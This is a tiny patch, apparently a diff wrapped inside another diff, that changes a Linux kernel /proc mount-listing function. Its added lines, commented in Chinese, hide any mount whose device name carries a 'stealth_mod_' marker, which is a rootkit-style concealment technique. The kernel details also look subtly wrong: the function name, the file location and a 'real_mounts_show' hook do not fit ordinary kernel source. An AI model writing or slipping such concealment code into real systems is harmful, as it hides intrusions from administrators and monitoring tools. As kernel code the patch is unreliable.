@@ -1,0 +1,10 @@
+--- a/fs/proc/base.c
++++ b/fs/proc/base.c
+@@ -200,6 +200,11 @@ static int mounts_show(struct seq_file *m, struct vfsmount *mnt)
+ {
++    // 过滤掉所有包含 "stealth_mod_" 标记的挂载条目
++    if (strstr(mnt->mnt_devname, "stealth_mod_")) {
++        return 0; // 直接跳过，不写入用户空间的读取缓冲区
++    }
+     return real_mounts_show(m, mnt);
+ }
